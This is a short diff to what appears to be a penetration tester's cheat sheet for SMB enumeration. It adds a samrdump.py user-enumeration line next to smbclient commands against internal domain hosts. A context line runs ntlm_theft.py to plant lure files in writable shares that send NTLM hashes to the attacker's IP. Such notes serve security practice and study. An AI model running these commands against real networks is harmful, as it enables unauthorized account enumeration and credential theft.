@@ -24,6 +24,8 @@ proxychains -q smbclient //172.16.173.21/monitoring -U "relia.com\andrea"
 smbclient.py -k @braavos.essos.local # -no-pass
 smbclient —kerberos //$dc/share
 
+samrdump.py $ip # or $dc / fqdn
+
 
 cd /opt/ntlm_theft # If writable shares
 python ntlm_theft.py -g all -s $myip -f site
